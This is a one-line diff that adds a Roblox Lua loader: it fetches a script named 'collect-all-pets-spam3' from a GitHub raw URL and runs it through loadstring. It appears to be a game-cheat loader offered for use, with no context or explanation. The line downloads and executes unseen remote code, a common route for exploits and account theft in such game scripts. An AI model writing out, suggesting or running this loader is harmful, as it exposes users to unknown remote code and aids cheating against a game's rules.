@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/blackbarbarianpush/loaders/main/loaders/collect-all-pets-spam3-yvj2eqyxo169wt.lua"))()
